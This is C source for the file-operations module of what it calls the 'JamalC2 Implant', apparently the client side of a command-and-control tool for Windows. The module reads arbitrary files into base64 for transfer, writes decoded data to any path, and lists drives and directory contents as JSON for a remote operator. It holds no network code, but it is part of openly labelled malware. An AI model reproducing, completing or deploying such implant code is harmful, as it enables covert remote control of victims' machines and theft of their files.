/*
 * JamalC2 Implant - File Operations Implementation
 */

#include "files.h"
#include "utils.h"
#include <stdio.h>
#include <stdlib.h>
#include <windows.h>

// 将 ANSI 编码（系统本地编码，如 GBK）转换为 UTF-8
static char *ansi_to_utf8(const char *ansi_str) {
  if (!ansi_str || !ansi_str[0]) {
    return safe_strdup("");
  }

  // 先转换为 Wide Char (UTF-16)
  int wide_len = MultiByteToWideChar(CP_ACP, 0, ansi_str, -1, NULL, 0);
  if (wide_len == 0) {
    return safe_strdup(ansi_str); // 失败时返回原字符串
  }

  wchar_t *wide_str = safe_malloc(wide_len * sizeof(wchar_t));
  MultiByteToWideChar(CP_ACP, 0, ansi_str, -1, wide_str, wide_len);

  // 再从 Wide Char 转换为 UTF-8
  int utf8_len =
      WideCharToMultiByte(CP_UTF8, 0, wide_str, -1, NULL, 0, NULL, NULL);
  if (utf8_len == 0) {
    free(wide_str);
    return safe_strdup(ansi_str);
  }

  char *utf8_str = safe_malloc(utf8_len);
  WideCharToMultiByte(CP_UTF8, 0, wide_str, -1, utf8_str, utf8_len, NULL, NULL);

  free(wide_str);
  return utf8_str;
}

char *files_read_base64(const char *path) {
  HANDLE hFile = CreateFileA(path, GENERIC_READ, FILE_SHARE_READ, NULL,
                             OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
  if (hFile == INVALID_HANDLE_VALUE) {
    return NULL;
  }

  DWORD file_size = GetFileSize(hFile, NULL);
  if (file_size == INVALID_FILE_SIZE || file_size == 0) {
    CloseHandle(hFile);
    return NULL;
  }

  uint8_t *data = safe_malloc(file_size);
  DWORD bytes_read;

  if (!ReadFile(hFile, data, file_size, &bytes_read, NULL) ||
      bytes_read != file_size) {
    free(data);
    CloseHandle(hFile);
    return NULL;
  }

  CloseHandle(hFile);

  char *encoded = base64_encode(data, file_size);
  free(data);

  return encoded;
}

int files_write_base64(const char *path, const char *base64_content) {
  uint8_t *data = NULL;
  int data_len = base64_decode(base64_content, &data);

  if (data_len < 0 || !data) {
    return -1;
  }

  HANDLE hFile = CreateFileA(path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS,
                             FILE_ATTRIBUTE_NORMAL, NULL);
  if (hFile == INVALID_HANDLE_VALUE) {
    free(data);
    return -1;
  }

  DWORD bytes_written;
  BOOL success = WriteFile(hFile, data, data_len, &bytes_written, NULL);

  CloseHandle(hFile);
  free(data);

  return (success && bytes_written == (DWORD)data_len) ? 0 : -1;
}

int files_exists(const char *path) {
  DWORD attrs = GetFileAttributesA(path);
  return (attrs != INVALID_FILE_ATTRIBUTES);
}

int64_t files_size(const char *path) {
  WIN32_FILE_ATTRIBUTE_DATA data;
  if (!GetFileAttributesExA(path, GetFileExInfoStandard, &data)) {
    return -1;
  }
  LARGE_INTEGER size;
  size.HighPart = data.nFileSizeHigh;
  size.LowPart = data.nFileSizeLow;
  return size.QuadPart;
}

// JSON 字符串转义：转义反斜杠、引号和控制字符
static char *json_escape_string(const char *input) {
  if (!input)
    return safe_strdup("");

  // 最坏情况每个字符需要 6 字节（\uXXXX）
  size_t max_len = strlen(input) * 6 + 1;
  char *output = safe_malloc(max_len);
  char *dst = output;

  for (const char *src = input; *src; src++) {
    switch ((unsigned char)*src) {
    case '\\':
      *dst++ = '\\';
      *dst++ = '\\';
      break;
    case '"':
      *dst++ = '\\';
      *dst++ = '"';
      break;
    case '\n':
      *dst++ = '\\';
      *dst++ = 'n';
      break;
    case '\r':
      *dst++ = '\\';
      *dst++ = 'r';
      break;
    case '\t':
      *dst++ = '\\';
      *dst++ = 't';
      break;
    case '\b':
      *dst++ = '\\';
      *dst++ = 'b';
      break;
    case '\f':
      *dst++ = '\\';
      *dst++ = 'f';
      break;
    default:
      if ((unsigned char)*src < 0x20) {
        // 控制字符用 \u00XX 表示
        dst += sprintf(dst, "\\u%04x", (unsigned char)*src);
      } else {
        *dst++ = *src;
      }
      break;
    }
  }
  *dst = '\0';
  return output;
}

// 将 UTF-8 字符串转换为 Wide Char (UTF-16)
static wchar_t *utf8_to_wide(const char *utf8_str) {
  if (!utf8_str || !utf8_str[0]) {
    wchar_t *empty = safe_malloc(sizeof(wchar_t));
    empty[0] = L'\0';
    return empty;
  }

  int wide_len = MultiByteToWideChar(CP_UTF8, 0, utf8_str, -1, NULL, 0);
  if (wide_len == 0) {
    // UTF-8 解码失败，尝试按 ANSI 解码
    wide_len = MultiByteToWideChar(CP_ACP, 0, utf8_str, -1, NULL, 0);
    if (wide_len == 0) {
      wchar_t *empty = safe_malloc(sizeof(wchar_t));
      empty[0] = L'\0';
      return empty;
    }
    wchar_t *wide_str = safe_malloc(wide_len * sizeof(wchar_t));
    MultiByteToWideChar(CP_ACP, 0, utf8_str, -1, wide_str, wide_len);
    return wide_str;
  }

  wchar_t *wide_str = safe_malloc(wide_len * sizeof(wchar_t));
  MultiByteToWideChar(CP_UTF8, 0, utf8_str, -1, wide_str, wide_len);
  return wide_str;
}

// 将 Wide Char (UTF-16) 转换为 UTF-8
static char *wide_to_utf8(const wchar_t *wide_str) {
  if (!wide_str || !wide_str[0]) {
    return safe_strdup("");
  }

  int utf8_len =
      WideCharToMultiByte(CP_UTF8, 0, wide_str, -1, NULL, 0, NULL, NULL);
  if (utf8_len == 0) {
    return safe_strdup("");
  }

  char *utf8_str = safe_malloc(utf8_len);
  WideCharToMultiByte(CP_UTF8, 0, wide_str, -1, utf8_str, utf8_len, NULL, NULL);
  return utf8_str;
}

char *files_list_dir(const char *path) {
  char *result = NULL;
  size_t result_size = 0;
  size_t result_used = 0;

  // 如果路径为空，列出所有驱动器
  if (path == NULL || path[0] == '\0') {
    result_size = 4096;
    result = safe_malloc(result_size);
    result[result_used++] = '[';

    DWORD drives = GetLogicalDrives();
    int first = 1;

    for (char letter = 'A'; letter <= 'Z'; letter++) {
      if (drives & (1 << (letter - 'A'))) {
        char entry[256];
        snprintf(entry, sizeof(entry),
                 "%s{\"name\":\"%c:\\\\\",\"path\":\"%c:\\\\\",\"is_dir\":true,"
                 "\"size\":0}",
                 first ? "" : ",", letter, letter);

        size_t entry_len = strlen(entry);
        while (result_used + entry_len + 2 > result_size) {
          result_size *= 2;
          result = safe_realloc(result, result_size);
        }

        memcpy(result + result_used, entry, entry_len);
        result_used += entry_len;
        first = 0;
      }
    }

    result[result_used++] = ']';
    result[result_used] = '\0';
    return result;
  }

  // 将 UTF-8 路径转为 Wide 字符后拼接通配符
  wchar_t *wide_path = utf8_to_wide(path);
  size_t wp_len = wcslen(wide_path);
  wchar_t *search_path = safe_malloc((wp_len + 3) * sizeof(wchar_t));
  wcscpy(search_path, wide_path);
  if (wp_len > 0 && wide_path[wp_len - 1] != L'\\') {
    wcscat(search_path, L"\\*");
  } else {
    wcscat(search_path, L"*");
  }

  WIN32_FIND_DATAW fd;
  HANDLE hFind = FindFirstFileW(search_path, &fd);
  free(search_path);
  free(wide_path);

  if (hFind == INVALID_HANDLE_VALUE) {
    return safe_strdup("[]");
  }

  result_size = 4096;
  result = safe_malloc(result_size);
  result[result_used++] = '[';

  int first = 1;
  do {
    if (wcscmp(fd.cFileName, L".") == 0 || wcscmp(fd.cFileName, L"..") == 0) {
      continue;
    }

    // 将文件名从 Wide Char 直接转为 UTF-8
    char *utf8_name = wide_to_utf8(fd.cFileName);

    // 构建完整 UTF-8 路径
    size_t path_len = strlen(path);
    size_t name_len = strlen(utf8_name);
    size_t full_len = path_len + 1 + name_len + 1;
    char *full_path = safe_malloc(full_len);
    if (path_len > 0 && path[path_len - 1] == '\\') {
      snprintf(full_path, full_len, "%s%s", path, utf8_name);
    } else {
      snprintf(full_path, full_len, "%s\\%s", path, utf8_name);
    }

    // 对 name 和 path 统一做 JSON 转义
    char *escaped_name = json_escape_string(utf8_name);
    char *escaped_path = json_escape_string(full_path);

    char entry[4096];
    int is_dir = (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) ? 1 : 0;
    LARGE_INTEGER file_size;
    file_size.HighPart = fd.nFileSizeHigh;
    file_size.LowPart = fd.nFileSizeLow;

    snprintf(entry, sizeof(entry),
             "%s{\"name\":\"%s\",\"path\":\"%s\",\"is_dir\":%s,\"size\":%lld}",
             first ? "" : ",", escaped_name, escaped_path,
             is_dir ? "true" : "false", file_size.QuadPart);

    free(utf8_name);
    free(full_path);
    free(escaped_name);
    free(escaped_path);

    size_t entry_len = strlen(entry);
    while (result_used + entry_len + 2 > result_size) {
      result_size *= 2;
      result = safe_realloc(result, result_size);
    }

    memcpy(result + result_used, entry, entry_len);
    result_used += entry_len;
    first = 0;

  } while (FindNextFileW(hFind, &fd));

  FindClose(hFind);

  result[result_used++] = ']';
  result[result_used] = '\0';

  return result;
}
